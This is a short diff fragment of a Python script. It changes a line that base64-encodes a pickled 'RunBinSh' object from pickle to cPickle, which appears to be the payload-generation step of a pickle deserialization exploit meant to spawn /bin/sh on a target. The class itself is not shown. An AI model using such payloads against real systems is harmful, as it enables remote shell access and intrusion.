@@ -32,4 +32,4 @@ def index():
     import_urlib_version(module)
 
 
-print(base64.b64encode(pickle.dumps(RunBinSh())))
+print(base64.b64encode(cPickle.dumps(RunBinSh())))
